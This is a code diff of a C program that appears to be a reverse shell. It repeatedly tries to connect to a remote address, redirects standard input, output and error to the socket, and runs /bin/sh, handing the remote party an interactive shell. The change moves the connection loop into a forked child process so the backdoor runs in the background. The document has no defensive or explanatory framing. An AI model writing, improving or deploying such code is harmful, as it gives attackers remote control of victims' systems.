@@ -25,30 +25,28 @@ int main(int argc, char** argv)
         exit(1);
 	}
     
-	int sock;
-    while( (sock = attempt_connection_to_server(remote_address)) == -1)
-	{
-		printf("Sleeping\n");
-		sleep(POLL_DURATION);
-	}
-	
-    execute_shell(sock);
+	int sock, pid;
+    pid = fork();
+    if(pid == 0){
+         while( (sock = attempt_connection_to_server(remote_address)) == -1)
+        {
+            printf("Sleeping\n");
+            sleep(POLL_DURATION);
+        }
+        
+        execute_shell(sock);
+    }   
 	return 1;
 }
 
 void execute_shell(int socket_fd)
 {
-    int pid;
     dup2(socket_fd, 0); //stdin
     dup2(socket_fd, 1); //stdout
     dup2(socket_fd, 2); //stderr
 
     char *argv[1] = {"/bin/sh"};
-
-    pid = fork();
-    if( pid == 0 ){
-        execve(argv[0], argv, NULL);
-    }
+    execve(argv[0], argv, NULL);
 }
 
 int attempt_connection_to_server(char *remote_address){
